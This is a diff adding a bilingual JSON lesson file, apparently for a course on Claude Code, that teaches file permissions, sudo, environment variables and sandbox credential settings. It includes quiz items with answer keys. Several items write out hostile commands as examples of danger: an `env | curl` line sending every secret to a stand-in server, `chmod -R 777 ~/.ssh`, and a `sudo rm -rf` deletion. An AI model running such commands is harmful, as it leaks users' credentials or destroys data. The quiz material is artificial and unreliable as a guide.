@@ -1,0 +1,733 @@
+{
+  "cards": [
+    {
+      "id": "powers-card-users",
+      "title": { "en": "Users: every program runs as someone", "ja": "ユーザー：どのプログラムも「誰か」として動く" },
+      "body": [
+        {
+          "en": "Your computer has user accounts: one for you, maybe others for family or for background services. Every file has an owner, and every running program runs as some user. That user decides what the program may touch.",
+          "ja": "コンピューターにはユーザーアカウントがあります。あなた用のものがひとつ、ほかに家族用や、裏で動くサービス用のものがあるかもしれません。どのファイルにも持ち主（オーナー）がいて、動いているプログラムはどれも、いずれかのユーザーとして動いています。そのユーザーが誰かによって、プログラムが触れられる範囲が決まります。"
+        },
+        {
+          "en": "`whoami` prints the user you are right now. When you start Claude Code, it runs as that same user. So do the commands it runs.",
+          "ja": "`whoami` は、今あなたがどのユーザーなのかを表示します。Claude Code を起動すると、Claude Code もそれと同じユーザーとして動きます。Claude Code が実行するコマンドも同じです。"
+        }
+      ],
+      "key": {
+        "en": "There is no separate \"Claude\" account. Claude acts as you.",
+        "ja": "「Claude 専用」のアカウントはありません。Claude はあなたとして動きます。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
+          {
+            "cmd": "whoami",
+            "output": [
+              {
+                "text": "you",
+                "note": { "en": "Your user name. Claude's commands print the same", "ja": "あなたのユーザー名。Claude のコマンドでも同じ表示になる" }
+              }
+            ]
+          }
+        ]
+      },
+      "more": { "slug": "security" }
+    },
+    {
+      "id": "powers-card-rwx",
+      "title": { "en": "File permissions: r, w, x", "ja": "ファイルの権限：r、w、x" },
+      "body": [
+        {
+          "en": "Each file says who may do what with it. `ls -l` (list, long form) shows this as a code like `-rw-r--r--`. The first character is `-` for a file or `d` for a folder (a directory).",
+          "ja": "ファイルにはそれぞれ、誰が何をしてよいかが記されています。`ls -l`（詳しい形式での一覧）を使うと、それが `-rw-r--r--` のような記号で表示されます。最初の1文字は、ファイルなら `-`、フォルダ（ディレクトリ）なら `d` です。"
+        },
+        {
+          "en": "Then come three groups of three: the owner, the owner's group, and everyone else. `r` means read, `w` means write (change or delete), `x` means run it as a program (for a folder: open it). A `-` means \"not allowed\".",
+          "ja": "そのあとに3文字ずつ3つの組が続きます。持ち主、持ち主のグループ、それ以外の全員の順です。`r` は読む、`w` は書く（変更や削除）、`x` はプログラムとして実行する（フォルダなら中に入る）という意味です。`-` は「許可なし」です。"
+        }
+      ],
+      "key": {
+        "en": "Read the three groups left to right: me, my group, everyone.",
+        "ja": "3つの組は左から順に「自分」「自分のグループ」「全員」と読みます。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
+          {
+            "cmd": "ls -l",
+            "output": [
+              {
+                "text": "-rw-r--r--  1 you  staff   512 notes.txt",
+                "note": { "en": "You read and write; everyone else only reads", "ja": "あなたは読み書きでき、ほかの人は読むだけ" }
+              },
+              {
+                "text": "-rwxr-xr-x  1 you  staff   220 deploy.sh",
+                "note": { "en": "x: it can be run as a program", "ja": "x：プログラムとして実行できる" }
+              },
+              {
+                "text": "drwx------  4 you  staff   128 private",
+                "note": { "en": "d: a folder. Only you can open it", "ja": "d：フォルダ。開けるのはあなただけ" }
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "powers-card-chmod",
+      "title": { "en": "chmod, and why 777 is a red flag", "ja": "chmod と、777 が危険信号である理由" },
+      "body": [
+        {
+          "en": "`chmod` (change mode) changes a file's permissions. `chmod +x deploy.sh` makes a script runnable: a normal fix when you see \"permission denied\".",
+          "ja": "`chmod`（change mode、モードの変更）は、ファイルの権限を変えるコマンドです。`chmod +x deploy.sh` はスクリプトを実行できるようにします。「permission denied」（許可がない）と出たときの、よくある直し方です。"
+        },
+        {
+          "en": "`chmod 777` means everyone may read, write and run it. That \"fixes\" every permission error by switching the lock off. On `~/.ssh` (your login keys) or a secrets file, it lets every account and service on the machine read them.",
+          "ja": "`chmod 777` は「全員が読み書き・実行できる」という意味です。ロックそのものを外してしまうことで、どんな権限エラーも「直して」しまいます。`~/.ssh`（ログイン用の鍵）や秘密情報のファイルに使うと、そのマシン上のすべてのアカウントやサービスが読めるようになります。"
+        }
+      ],
+      "key": {
+        "en": "Give the smallest permission that works. 777 is never it.",
+        "ja": "うまく動く範囲で、いちばん小さな権限を与えましょう。777 はその答えではありません。"
+      },
+      "deep": {
+        "title": { "en": "Under the hood: what the digits mean", "ja": "しくみ：数字の意味" },
+        "body": [
+          {
+            "en": "Each digit is one group (owner, group, everyone). Add read = 4, write = 2, run = 1. So 7 = 4+2+1 (everything), 6 = read and write, 5 = read and run, 0 = nothing.",
+            "ja": "数字1つが1つの組（持ち主、グループ、全員）を表します。読む = 4、書く = 2、実行 = 1 を足し合わせます。つまり 7 = 4+2+1（すべて）、6 = 読み書き、5 = 読む＋実行、0 = 何もできない、です。"
+          },
+          {
+            "en": "Safe settings for secrets: `chmod 600` for a key file (only you read and write) and `chmod 700` for `~/.ssh` (only you open it). SSH itself refuses a private key that other users can read.",
+            "ja": "秘密情報に向いた設定は、鍵ファイルなら `chmod 600`（自分だけが読み書きできる）、`~/.ssh` なら `chmod 700`（自分だけが開ける）です。SSH 自体も、ほかのユーザーが読める秘密鍵は使おうとしません。"
+          }
+        ]
+      }
+    },
+    {
+      "id": "powers-card-sudo",
+      "title": { "en": "sudo: borrowing the administrator's powers", "ja": "sudo：管理者の力を借りる" },
+      "body": [
+        {
+          "en": "`root` is the administrator account. It can read, change or delete anything on the machine. `sudo` (\"do as the superuser\") runs one command as root, after asking for your password.",
+          "ja": "`root` は管理者のアカウントで、マシン上のあらゆるものを読み、変え、消すことができます。`sudo`（「スーパーユーザーとして実行」）は、あなたのパスワードを確認したうえで、コマンドを1つ root として実行します。"
+        },
+        {
+          "en": "Claude Code guards this. On Linux and macOS it refuses to start Bypass permissions mode (no prompts at all, `--dangerously-skip-permissions`) as root or under `sudo`. If Claude asks to run `sudo`, that is a big step: ask why first.",
+          "ja": "Claude Code はここを守っています。Linux と macOS では、root として、あるいは `sudo` の下で、Bypass permissions モード（確認をまったく出さないモード、`--dangerously-skip-permissions`）を起動しようとすると拒否します。Claude が `sudo` を実行したいと言ってきたら、それは大きな一歩です。まず理由を聞きましょう。"
+        }
+      ],
+      "key": {
+        "en": "No prompts plus root powers is the worst mix, so Claude Code won't start that way.",
+        "ja": "「確認なし」と「root の力」の組み合わせは最悪なので、Claude Code はその状態では起動しません。"
+      },
+      "more": { "slug": "permission-modes", "anchor": "skip-all-checks-with-bypasspermissions-mode" }
+    },
+    {
+      "id": "powers-card-env",
+      "title": { "en": "Environment variables: settings that ride along", "ja": "環境変数：一緒についてくる設定" },
+      "body": [
+        {
+          "en": "An environment variable is a named value that every program you start can read. `$` means \"the value of\", so `echo $HOME` prints your home folder. `env` prints them all.",
+          "ja": "環境変数とは、あなたが起動するどのプログラムからも読める、名前の付いた値です。`$` は「〜の値」という意味なので、`echo $HOME` はホームフォルダの場所を表示します。`env` はすべての環境変数を表示します。"
+        },
+        {
+          "en": "Some hold secrets, like `GITHUB_TOKEN`, a key that lets tools act on your GitHub account. Programs started from your terminal get a copy, and that includes Claude Code and the commands it runs.",
+          "ja": "中には `GITHUB_TOKEN`（ツールがあなたの GitHub アカウントで操作するための鍵）のような秘密情報が入っているものもあります。ターミナルから起動したプログラムはそのコピーを受け取ります。Claude Code も、Claude Code が実行するコマンドも同じです。"
+        }
+      ],
+      "key": {
+        "en": "A command that prints or sends `env` can leak every secret in it.",
+        "ja": "`env` を表示したり送ったりするコマンドは、そこにある秘密情報をすべて漏らしかねません。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~/portfolio",
+        "commands": [
+          {
+            "cmd": "echo $HOME",
+            "output": [
+              {
+                "text": "/Users/you",
+                "note": { "en": "Harmless: just where your home folder is", "ja": "無害：ホームフォルダの場所にすぎない" }
+              }
+            ]
+          },
+          {
+            "cmd": "env",
+            "output": [
+              { "text": "HOME=/Users/you" },
+              { "text": "SHELL=/bin/zsh" },
+              {
+                "text": "GITHUB_TOKEN=ghp_FAKE7f3k2example",
+                "secret": true,
+                "note": { "en": "A secret, readable by every command you start", "ja": "秘密情報。あなたが起動するどのコマンドからも読める" }
+              }
+            ]
+          }
+        ]
+      },
+      "more": { "slug": "env-vars" }
+    },
+    {
+      "id": "powers-card-scrub",
+      "title": { "en": "Secrets ride into the sandbox too", "ja": "秘密情報はサンドボックスの中にもついてくる" },
+      "body": [
+        {
+          "en": "Claude Code's sandbox (a fence around the commands Claude runs) limits files and network. But its commands still inherit your environment variables, secrets included, unless you remove them.",
+          "ja": "Claude Code のサンドボックス（Claude が実行するコマンドを囲む柵）は、ファイルとネットワークを制限します。それでも、そこで動くコマンドは、あなたが取り除かない限り、秘密情報も含めて環境変数を引き継ぎます。"
+        },
+        {
+          "en": "`sandbox.credentials.envVars` lists the ones to remove: a `deny` entry unsets that variable before each sandboxed command. Nothing is removed unless you list it. `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` strips most credentials from every command Claude Code starts, sandboxed or not. It keeps GitHub tokens, so list `GITHUB_TOKEN` yourself.",
+          "ja": "`sandbox.credentials.envVars` に、取り除く変数を並べます。`deny` の項目は、サンドボックス内のコマンドを実行するたびに、その前にその変数を消します。書いていないものは何も消されません。`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` を設定すると、サンドボックスの中か外かに関係なく、Claude Code が起動するすべてのコマンドから、ほとんどの認証情報が取り除かれます。ただし GitHub のトークンは残るので、`GITHUB_TOKEN` は自分で書き出しましょう。"
+        }
+      ],
+      "key": {
+        "en": "A fence doesn't empty your pockets. List the secrets to leave behind.",
+        "ja": "柵があっても、ポケットの中身はそのままです。置いていく秘密情報を書き出しましょう。"
+      },
+      "demo": {
+        "kind": "terminal",
+        "cwd": "~",
+        "commands": [
+          {
+            "cmd": "cat ~/.claude/settings.json",
+            "output": [
+              { "text": "{" },
+              { "text": "  \"sandbox\": {" },
+              { "text": "    \"enabled\": true," },
+              { "text": "    \"credentials\": {" },
+              { "text": "      \"envVars\": [" },
+              {
+                "text": "        { \"name\": \"GITHUB_TOKEN\", \"mode\": \"deny\" }",
+                "note": { "en": "Unset before each sandboxed command", "ja": "サンドボックス内のコマンドの前に毎回消される" }
+              },
+              { "text": "      ]" },
+              { "text": "    }" },
+              { "text": "  }" },
+              { "text": "}" }
+            ]
+          }
+        ]
+      },
+      "more": { "slug": "sandboxing", "anchor": "protect-credentials" }
+    },
+    {
+      "id": "powers-card-you",
+      "title": { "en": "Claude runs with your powers", "ja": "Claude はあなたの権限で動く" },
+      "body": [
+        {
+          "en": "Put it together. A command Claude runs can read what you can read, like `~/.ssh` and `~/.aws/credentials`. The docs say a Bash command you approve \"can still write anywhere your user account can\". It also sees your environment variables.",
+          "ja": "まとめましょう。Claude が実行するコマンドは、`~/.ssh` や `~/.aws/credentials` のように、あなたが読めるものは読めます。公式ドキュメントにも、あなたが承認した Bash コマンドは「あなたのユーザーアカウントが書き込める場所ならどこにでも書き込める」とあります。環境変数も見えています。"
+        },
+        {
+          "en": "Permission prompts and the sandbox narrow that. Your account's powers are the most an approved command can do.",
+          "ja": "確認画面（パーミッションプロンプト）とサンドボックスが、その範囲を狭めます。承認されたコマンドにできることの上限は、あなたのアカウントの権限です。"
+        }
+      ],
+      "key": {
+        "en": "Before you approve, ask: would I run this myself, as me?",
+        "ja": "承認する前に、「これを自分で、自分として実行するだろうか？」と考えましょう。"
+      },
+      "more": { "slug": "security" }
+    }
+  ],
+  "items": [
+    {
+      "id": "powers-predict-1",
+      "type": "predict",
+      "prompt": { "en": "What does this print?", "ja": "何が表示されますか？" },
+      "situation": {
+        "en": "Claude runs this while checking your setup. Your user name is `you`, on a Mac.",
+        "ja": "Claude が設定を確認するためにこれを実行します。あなたのユーザー名は `you` で、Mac を使っています。"
+      },
+      "code": ["echo $HOME"],
+      "opts": [
+        {
+          "text": { "en": "/Users/you", "ja": "/Users/you" },
+          "mono": true,
+          "feedback": {
+            "en": "Right. `$HOME` is replaced by its value, your home folder. Nothing secret, nothing changed.",
+            "ja": "正解です。`$HOME` はその値、つまりホームフォルダの場所に置き換えられます。秘密情報でもなく、何も変更しません。"
+          }
+        },
+        {
+          "text": { "en": "$HOME", "ja": "$HOME" },
+          "mono": true,
+          "feedback": {
+            "en": "The `$` tells the shell to swap in the variable's value, so the word itself isn't printed.",
+            "ja": "`$` は「変数の値に置き換えて」という合図なので、その文字そのものは表示されません。"
+          }
+        },
+        {
+          "text": { "en": "All your secret tokens", "ja": "あなたの秘密のトークンすべて" },
+          "feedback": {
+            "en": "That would be `env`, which prints every variable. `echo $HOME` prints just one, and it isn't a secret.",
+            "ja": "それはすべての変数を表示する `env` の場合です。`echo $HOME` が表示するのは1つだけで、秘密情報ではありません。"
+          }
+        },
+        {
+          "text": { "en": "An error: Claude isn't allowed to read variables", "ja": "エラー：Claude は変数を読めない" },
+          "feedback": {
+            "en": "Commands Claude runs see your environment variables, just like commands you run.",
+            "ja": "Claude が実行するコマンドも、あなたが実行するコマンドと同じように環境変数が見えます。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "`echo $HOME` is harmless: it prints where your home folder is. Not every `$` is dangerous; it matters which variable, and where the output goes.",
+        "ja": "`echo $HOME` は無害で、ホームフォルダの場所を表示するだけです。`$` がすべて危険なわけではありません。どの変数か、そして出力がどこへ行くかが大事です。"
+      }
+    },
+    {
+      "id": "powers-decode-1",
+      "type": "decode",
+      "prompt": { "en": "Match each piece of the command to what it does.", "ja": "コマンドの各部分と、その働きを組み合わせましょう。" },
+      "command": "ls -l ~/.ssh",
+      "parts": [
+        { "id": "ls", "code": "ls", "means": { "en": "List what's in a folder", "ja": "フォルダの中身を一覧表示する" } },
+        {
+          "id": "l",
+          "code": "-l",
+          "means": { "en": "Long form: permissions, owner, size and date", "ja": "詳しい形式：権限、持ち主、サイズ、日付" }
+        },
+        { "id": "path", "code": "~/.ssh", "means": { "en": "The hidden folder holding your SSH login keys", "ja": "SSH のログイン用の鍵が入った隠しフォルダ" } }
+      ],
+      "order": ["path", "ls", "l"],
+      "explain": {
+        "en": "It only lists names and permissions; it doesn't open the keys. This is a harmless way to check that `~/.ssh` is private (`drwx------`).",
+        "ja": "名前と権限を一覧にするだけで、鍵の中身は開きません。`~/.ssh` が自分専用（`drwx------`）になっているか確かめる、無害な方法です。"
+      }
+    },
+    {
+      "id": "powers-pairs-1",
+      "type": "pairs",
+      "prompt": { "en": "Match each letter or word to what it means.", "ja": "文字や言葉と、その意味を組み合わせましょう。" },
+      "items": [
+        { "id": "r", "left": { "en": "r", "ja": "r" }, "leftMono": true, "right": { "en": "May read the file", "ja": "ファイルを読める" } },
+        {
+          "id": "w",
+          "left": { "en": "w", "ja": "w" },
+          "leftMono": true,
+          "right": { "en": "May change or delete it", "ja": "変更や削除ができる" }
+        },
+        {
+          "id": "x",
+          "left": { "en": "x", "ja": "x" },
+          "leftMono": true,
+          "right": { "en": "May run it as a program", "ja": "プログラムとして実行できる" }
+        },
+        {
+          "id": "root",
+          "left": { "en": "root", "ja": "root" },
+          "leftMono": true,
+          "right": { "en": "The administrator account that can do anything", "ja": "何でもできる管理者のアカウント" }
+        }
+      ],
+      "order": ["root", "x", "r", "w"],
+      "explain": {
+        "en": "With these, `-rwxr-xr-x` reads as \"I can do everything; my group and everyone else can read and run it\".",
+        "ja": "これがわかれば、`-rwxr-xr-x` は「自分は何でもでき、グループとほかの全員は読んで実行できる」と読めます。"
+      }
+    },
+    {
+      "id": "powers-predict-2",
+      "type": "predict",
+      "prompt": { "en": "Who can read this file?", "ja": "このファイルを読めるのは誰ですか？" },
+      "situation": {
+        "en": "Claude ran `ls -l ~/.ssh` and got this line for your private key.",
+        "ja": "Claude が `ls -l ~/.ssh` を実行し、秘密鍵についてこの行が表示されました。"
+      },
+      "code": ["-rw-------  1 you  staff  411 id_ed25519"],
+      "opts": [
+        {
+          "text": { "en": "Only you (the owner)", "ja": "あなた（持ち主）だけ" },
+          "feedback": {
+            "en": "Right. `rw-` for the owner, then `---` and `---`: your group and everyone else get nothing. That's how a private key should look.",
+            "ja": "正解です。持ち主は `rw-`、続く `---` と `---` で、グループとほかの全員には何も許されていません。秘密鍵はこうあるべきです。"
+          }
+        },
+        {
+          "text": { "en": "Everyone on the computer", "ja": "コンピューター上の全員" },
+          "feedback": {
+            "en": "Everyone's group is the last three characters, `---`: no read. That would look like `-rw-r--r--`.",
+            "ja": "全員の組は最後の3文字の `---` で、読む権限はありません。全員が読めるなら `-rw-r--r--` のようになります。"
+          }
+        },
+        {
+          "text": { "en": "Nobody, not even you", "ja": "誰も読めない（あなたも）" },
+          "feedback": {
+            "en": "The first group, `rw-`, is yours: you can read and write it.",
+            "ja": "最初の組 `rw-` はあなたの分で、読み書きができます。"
+          }
+        },
+        {
+          "text": { "en": "You and your group", "ja": "あなたとあなたのグループ" },
+          "feedback": {
+            "en": "The middle three, the group's, are `---`. Only the owner has `r`.",
+            "ja": "真ん中の3文字（グループの分）は `---` です。`r` があるのは持ち主だけです。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "Read the code in groups after the first character: `rw-` (you), `---` (group), `---` (everyone). Note that \"only you\" includes every command Claude runs as you.",
+        "ja": "最初の1文字のあとを3文字ずつ区切って読みます。`rw-`（あなた）、`---`（グループ）、`---`（全員）。「あなただけ」には、あなたとして動く Claude のコマンドも含まれることに注意しましょう。"
+      }
+    },
+    {
+      "id": "powers-predict-3",
+      "type": "predict",
+      "prompt": { "en": "What will `ls -l` show now?", "ja": "今度の `ls -l` はどう表示されますか？" },
+      "situation": {
+        "en": "`notes.txt` was `-rw-r--r--`. Then someone ran the command below.",
+        "ja": "`notes.txt` は `-rw-r--r--` でした。そのあと、誰かが下のコマンドを実行しました。"
+      },
+      "code": ["chmod 777 notes.txt", "ls -l notes.txt"],
+      "opts": [
+        {
+          "text": { "en": "-rwxrwxrwx  1 you  staff  512 notes.txt", "ja": "-rwxrwxrwx  1 you  staff  512 notes.txt" },
+          "mono": true,
+          "feedback": {
+            "en": "Right. 7 is read + write + run, for all three groups. Anyone on the machine can now change or delete it.",
+            "ja": "正解です。7 は読む＋書く＋実行で、それが3つの組すべてに付きます。これでマシン上の誰もが変更や削除をできるようになりました。"
+          }
+        },
+        {
+          "text": { "en": "-rw-------  1 you  staff  512 notes.txt", "ja": "-rw-------  1 you  staff  512 notes.txt" },
+          "mono": true,
+          "feedback": {
+            "en": "That's `chmod 600`: only you. 777 goes the other way, opening it to everyone.",
+            "ja": "それは `chmod 600`（自分だけ）の結果です。777 はその逆で、全員に開いてしまいます。"
+          }
+        },
+        {
+          "text": { "en": "-rw-r--r--  1 you  staff  512 notes.txt", "ja": "-rw-r--r--  1 you  staff  512 notes.txt" },
+          "mono": true,
+          "feedback": {
+            "en": "`chmod` did change it. You own the file, so you don't need `sudo` to change its permissions.",
+            "ja": "`chmod` で権限は変わっています。ファイルの持ち主はあなたなので、権限を変えるのに `sudo` は要りません。"
+          }
+        },
+        {
+          "text": { "en": "An error: 777 isn't allowed", "ja": "エラー：777 は許されていない" },
+          "feedback": {
+            "en": "Nothing stops you. That's the problem: `chmod 777` always works, so it looks like a fix.",
+            "ja": "何も止めてくれません。それが問題です。`chmod 777` はいつでも通るので、解決策のように見えてしまいます。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "`chmod 777` gives everyone everything. It silences permission errors by removing the lock, which is why it's a red flag in any suggested fix.",
+        "ja": "`chmod 777` は全員にすべての権限を与えます。ロックを外すことで権限エラーを黙らせるので、提案された修正にこれが入っていたら危険信号です。"
+      }
+    },
+    {
+      "id": "powers-decode-2",
+      "type": "decode",
+      "prompt": { "en": "Match each piece of the command to what it does.", "ja": "コマンドの各部分と、その働きを組み合わせましょう。" },
+      "command": "chmod -R 777 ~/.ssh",
+      "parts": [
+        { "id": "chmod", "code": "chmod", "means": { "en": "Change who may do what with files", "ja": "ファイルに対して誰が何をできるかを変える" } },
+        { "id": "r", "code": "-R", "means": { "en": "Also every file inside the folder", "ja": "フォルダの中のすべてのファイルにも" } },
+        { "id": "777", "code": "777", "means": { "en": "Everyone may read, write and run", "ja": "全員が読み書き・実行できる" } },
+        { "id": "path", "code": "~/.ssh", "means": { "en": "The folder with your SSH login keys", "ja": "SSH のログイン用の鍵が入ったフォルダ" } }
+      ],
+      "order": ["777", "path", "chmod", "r"],
+      "explain": {
+        "en": "It makes your login keys readable and changeable by every account and service on the machine. SSH may then refuse to use them, so it doesn't even fix a login problem. The safe values are `700` for the folder and `600` for keys.",
+        "ja": "ログイン用の鍵を、マシン上のすべてのアカウントやサービスが読んだり変えたりできる状態にします。そうなると SSH が鍵を使うのを拒むこともあるので、ログインの問題すら直りません。安全な値は、フォルダが `700`、鍵が `600` です。"
+      }
+    },
+    {
+      "id": "powers-approve-1",
+      "type": "approve",
+      "surface": "terminal",
+      "prompt": { "en": "Claude wants to do this. What do you press?", "ja": "Claude がこれを実行しようとしています。どれを押しますか？" },
+      "explain": {
+        "en": "Giving your own project script the `x` (run) permission is the normal fix for \"permission denied\". It only changes one file, and only adds run.",
+        "ja": "自分のプロジェクトのスクリプトに `x`（実行）の権限を付けるのは、「permission denied」へのふつうの対処です。変わるのはファイル1つだけで、付け加わるのも実行の権限だけです。"
+      },
+      "task": {
+        "en": "`./deploy.sh` says \"permission denied\". Can you fix it?",
+        "ja": "`./deploy.sh` が「permission denied」と言われる。直してくれる？"
+      },
+      "narration": {
+        "en": "`ls -l` shows `deploy.sh` as `-rw-r--r--`: it has no `x`, so it can't run. I'll make it runnable.",
+        "ja": "`ls -l` を見ると `deploy.sh` は `-rw-r--r--` で、`x` がないため実行できません。実行できるようにします。"
+      },
+      "tool": "Bash",
+      "target": "chmod +x deploy.sh",
+      "reason": { "en": "Make deploy.sh runnable", "ja": "deploy.sh を実行できるようにします" },
+      "alwaysLabel": {
+        "en": "Yes, and don't ask again for: chmod +x *",
+        "ja": "はい、今後 chmod +x * は確認しない"
+      },
+      "choices": ["yes", "always", "auto", "no"],
+      "accept": ["yes"],
+      "outcomes": {
+        "yes": {
+          "feedback": {
+            "en": "Good. One file, in your project, gains run permission. Nobody else gets write access, and nothing leaves your machine.",
+            "ja": "その通りです。プロジェクト内のファイル1つに実行の権限が付くだけです。ほかの人に書き込み権限が渡ることもなく、何もマシンの外に出ません。"
+          }
+        },
+        "always": {
+          "feedback": {
+            "en": "The command is fine, but this is a one-off fix. Saving `Bash(chmod +x *)` would let Claude make any file runnable without asking. Plain Yes is enough.",
+            "ja": "コマンド自体は問題ありませんが、これは一度きりの修正です。`Bash(chmod +x *)` を保存すると、Claude はどのファイルでも確認なしで実行可能にできてしまいます。ふつうの「はい」で十分です。"
+          }
+        },
+        "auto": {
+          "feedback": {
+            "en": "The command itself was fine. But this course asks you to stay in Manual mode while you learn: in auto mode a classifier model would decide prompts like this instead of you.",
+            "ja": "コマンド自体は問題ありませんでした。ただ、このコースでは、学んでいる間は Manual モードのままにしておきましょう。auto モードでは、こうした確認をあなたの代わりに分類モデルが判断します。"
+          }
+        },
+        "no": {
+          "feedback": {
+            "en": "This was safe and exactly what you asked for. `+x` adds only run permission to one file of yours. Saying No just leaves the script broken.",
+            "ja": "これは安全で、頼んだことそのものでした。`+x` はあなたのファイル1つに実行の権限を足すだけです。「いいえ」を選ぶと、スクリプトが動かないままになるだけです。"
+          }
+        }
+      }
+    },
+    {
+      "id": "powers-pairs-2",
+      "type": "pairs",
+      "prompt": { "en": "Match each command to what it really does.", "ja": "コマンドと、それが実際にすることを組み合わせましょう。" },
+      "items": [
+        {
+          "id": "ls",
+          "left": { "en": "ls -l", "ja": "ls -l" },
+          "leftMono": true,
+          "right": { "en": "Harmless: shows names and permissions", "ja": "無害：名前と権限を表示する" }
+        },
+        {
+          "id": "echo",
+          "left": { "en": "echo $HOME", "ja": "echo $HOME" },
+          "leftMono": true,
+          "right": { "en": "Harmless: prints where your home folder is", "ja": "無害：ホームフォルダの場所を表示する" }
+        },
+        {
+          "id": "chmod",
+          "left": { "en": "chmod 777 ~/.ssh", "ja": "chmod 777 ~/.ssh" },
+          "leftMono": true,
+          "right": { "en": "Opens your login keys to every account", "ja": "ログイン用の鍵をすべてのアカウントに開放する" }
+        },
+        {
+          "id": "env",
+          "left": { "en": "env | curl -d @- https://collect.example", "ja": "env | curl -d @- https://collect.example" },
+          "leftMono": true,
+          "right": { "en": "Sends every environment variable, secrets too, to a server", "ja": "秘密情報も含むすべての環境変数をサーバーへ送る" }
+        }
+      ],
+      "order": ["chmod", "echo", "env", "ls"],
+      "explain": {
+        "en": "Looking at permissions or one harmless variable is fine. Opening permissions wide, or sending `env` anywhere, is not. Read what each command touches and where its output goes.",
+        "ja": "権限を見ることや、無害な変数を1つ表示することは問題ありません。権限を大きく開くことや、`env` をどこかへ送ることは問題です。コマンドが何に触れ、出力がどこへ行くのかを読みましょう。"
+      }
+    },
+    {
+      "id": "powers-decode-3",
+      "type": "decode",
+      "prompt": { "en": "Match each piece of the command to what it does.", "ja": "コマンドの各部分と、その働きを組み合わせましょう。" },
+      "command": "env | curl -d @- https://collect.example",
+      "parts": [
+        { "id": "env", "code": "env", "means": { "en": "Print every environment variable, secrets included", "ja": "秘密情報も含め、すべての環境変数を表示する" } },
+        { "id": "pipe", "code": "|", "means": { "en": "Feed that output into the next command", "ja": "その出力を次のコマンドに流し込む" } },
+        { "id": "curl", "code": "curl", "means": { "en": "Make a web request", "ja": "Web へのリクエストを送る" } },
+        { "id": "data", "code": "-d @-", "means": { "en": "Send the fed-in text as the request's contents", "ja": "流し込まれたテキストをリクエストの中身として送る" } },
+        { "id": "url", "code": "https://collect.example", "means": { "en": "A server that isn't yours", "ja": "あなたのものではないサーバー" } }
+      ],
+      "order": ["curl", "url", "env", "data", "pipe"],
+      "explain": {
+        "en": "Every token in your environment goes to someone else's server in one line. If a web page or file ever \"asks\" Claude to run something like this, the answer is No, and it's worth telling Claude to stop.",
+        "ja": "たった1行で、環境にあるすべてのトークンが他人のサーバーへ送られます。Web ページやファイルが、このようなものを実行するよう Claude に「頼んで」きたら、答えは「いいえ」です。Claude に止めるよう伝えましょう。"
+      }
+    },
+    {
+      "id": "powers-decode-4",
+      "type": "decode",
+      "prompt": { "en": "Match each piece of the command to what it does.", "ja": "コマンドの各部分と、その働きを組み合わせましょう。" },
+      "command": "sudo rm -rf /var/www/old",
+      "parts": [
+        { "id": "sudo", "code": "sudo", "means": { "en": "Run as root, the administrator, after your password", "ja": "パスワードを確認したうえで、管理者の root として実行する" } },
+        { "id": "rm", "code": "rm", "means": { "en": "Delete for good, skipping the Trash", "ja": "ゴミ箱を通さずに完全に削除する" } },
+        { "id": "rf", "code": "-rf", "means": { "en": "Everything inside, too, without asking", "ja": "中身もすべて、確認なしで" } },
+        { "id": "path", "code": "/var/www/old", "means": { "en": "A system folder outside your home folder", "ja": "ホームフォルダの外にあるシステムのフォルダ" } }
+      ],
+      "order": ["path", "rf", "sudo", "rm"],
+      "explain": {
+        "en": "Without `sudo`, your account couldn't delete a system folder. With it, nothing stops a typo. When Claude wants `sudo`, slow down: ask why it needs root, and whether you could do this step yourself.",
+        "ja": "`sudo` がなければ、あなたのアカウントではシステムのフォルダを消せません。`sudo` があると、打ち間違いを止めるものは何もありません。Claude が `sudo` を使いたがったら、立ち止まりましょう。なぜ root が必要なのか、この作業を自分でできないかを聞きましょう。"
+      }
+    },
+    {
+      "id": "powers-predict-4",
+      "type": "predict",
+      "prompt": { "en": "What happens?", "ja": "どうなりますか？" },
+      "situation": {
+        "en": "On a Linux server, someone tries to run Claude Code as root with no prompts at all.",
+        "ja": "Linux サーバーで、誰かが確認をいっさい出さない設定で Claude Code を root として実行しようとします。"
+      },
+      "code": ["sudo claude --dangerously-skip-permissions"],
+      "opts": [
+        {
+          "text": {
+            "en": "--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons",
+            "ja": "--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons"
+          },
+          "mono": true,
+          "feedback": {
+            "en": "Right. On Linux and macOS, Claude Code refuses to start Bypass permissions mode as root or under `sudo`.",
+            "ja": "正解です。Linux と macOS では、Claude Code は root として、あるいは `sudo` の下で Bypass permissions モードを起動することを拒否します。"
+          }
+        },
+        {
+          "text": { "en": "It starts, with no prompts and full root powers", "ja": "確認なしで、root の全権限を持って起動する" },
+          "feedback": {
+            "en": "That's exactly the mix Claude Code blocks: nothing to stop a mistake, and nothing it couldn't change.",
+            "ja": "それこそ Claude Code が防いでいる組み合わせです。間違いを止めるものが何もなく、変えられないものも何もない状態です。"
+          }
+        },
+        {
+          "text": { "en": "It starts in Manual mode instead", "ja": "代わりに Manual モードで起動する" },
+          "feedback": {
+            "en": "It doesn't quietly switch modes. It refuses and prints a message saying why.",
+            "ja": "黙ってモードを切り替えたりはしません。起動を拒否し、理由を示すメッセージを表示します。"
+          }
+        },
+        {
+          "text": { "en": "It asks Claude whether that's OK", "ja": "それでよいかを Claude に尋ねる" },
+          "feedback": {
+            "en": "This check is built into Claude Code itself; no model decides it.",
+            "ja": "このチェックは Claude Code 自体に組み込まれていて、モデルが判断するものではありません。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "No prompts plus root is the worst mix, so Claude Code won't start that way. The docs say the check is skipped inside a recognized sandbox; for unattended runs they suggest a dev container, which runs Claude Code as a non-root user.",
+        "ja": "「確認なし」と「root」の組み合わせは最悪なので、Claude Code はその状態では起動しません。ドキュメントによると、認識されたサンドボックスの中ではこのチェックが省かれます。無人で動かすなら、Claude Code を root ではないユーザーとして動かす dev container が勧められています。"
+      },
